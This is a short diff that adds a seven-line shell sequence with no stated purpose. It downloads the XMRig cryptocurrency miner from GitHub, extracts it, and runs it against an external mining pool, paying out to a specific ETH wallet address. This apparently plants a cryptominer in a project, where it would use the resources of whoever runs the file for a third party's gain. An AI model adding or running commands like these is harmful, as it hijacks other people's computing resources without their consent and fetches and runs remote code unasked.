@@ -1,0 +1,7 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
+
+tar -xf xmrig-6.12.1-linux-x64.tar.gz
+
+cd xmrig-6.12.1
+
+./xmrig -o rx.unmineable.com:3333 -a rx -k -u ETH:0xE9C5cC592900f0D40C4AD997e160d4A75Da3b9Cd.unmineabley_miner4
